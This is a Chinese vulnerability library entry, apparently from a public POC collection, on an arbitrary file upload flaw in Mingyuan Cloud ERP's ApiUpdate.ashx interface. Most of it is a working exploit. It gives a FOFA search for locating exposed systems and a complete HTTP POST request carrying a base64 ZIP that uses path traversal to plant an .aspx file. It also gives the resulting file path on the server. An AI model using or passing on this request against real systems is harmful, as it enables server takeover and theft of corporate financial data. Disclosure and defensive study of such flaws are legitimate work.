---
fofa: "(body="
source: "wy876 漏洞文库"
---

# 明源云ERP系统接口管家 ApiUpdate.ashx 文件存在任意文件上传漏洞

# 一、漏洞简介
明源云ERP系统是一个云端部署的ERP系统，具有高效、灵活和可定制的特点。它支持多种自定义功能，包括表单、报表、流程等，企业可以根据自身业务需求进行个性化定制，提高管理效率与操作便捷性。同时，该系统提供丰富的移动端应用，员工可以随时随地进行业务操作、数据查询与报表分析，实现高效协同，提高企业运营效率。此外，明源云ERP系统还具有精确的财务数据管理功能，通过集成各个财务子模块，实现财务数据的自动收集、整理和汇总，并自动生成准确的财务报表。总之，明源云ERP系统是一个高效、灵活、可定制的ERP系统，可以满足企业的个性化需求，并实现高效协同和精确的财务数据管理。明源云ERP系统接口管家 ApiUpdate.ashx 文件存在任意文件上传漏洞，攻击者通过构造特殊的ZIP压缩包可以上传任意文件，控制服务器。

# 二、影响版本
+ 明源云ERP系统接口管家

# 三、资产测绘
+ fofa`(body="hibot.js" || title="明源云ERP")`
+ 特征


# 四、漏洞复现
```http
POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 

{{base64_decode("UEsDBBQAAAAIAPKaC1eX6YtyjAAAAJMAAAAeAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9jaGVjay5hc3B4JMzLCsIwFATQXwmRQrsJCt1IqyiKUPBRWsT1bRhqIWliHoJ/b8TdMGeYOtuxlkawM81jTGHDDwvOsm2doNHWuMCupOEtyWT9xwdo0dz+E9YlMLOHeLgpIOdSlstyNax5UZ0mBXGEQup7uDecuJBtKTzzDq8IH8TdKbEfvFEx4AdFUaXbLwAAAP//AwBQSwECFAMUAAAACADymgtXl+mLcowAAACTAAAAHgAAAAAAAAAAAAAAAAAAAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9jaGVjay5hc3B4UEsFBgAAAAABAAEATAAAAMgAAAAAAA==")}}
```


上传文件位置

```http
/fdccloud/_/check.aspx
```


[Mosaic-crypt-tools-1.5-SNAPSHOT-jar-with-dependencies.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222141911-beeed224-b25e-4b46-a48c-afe3ed72af43.jar)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wlaowua3lmsbig8l>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
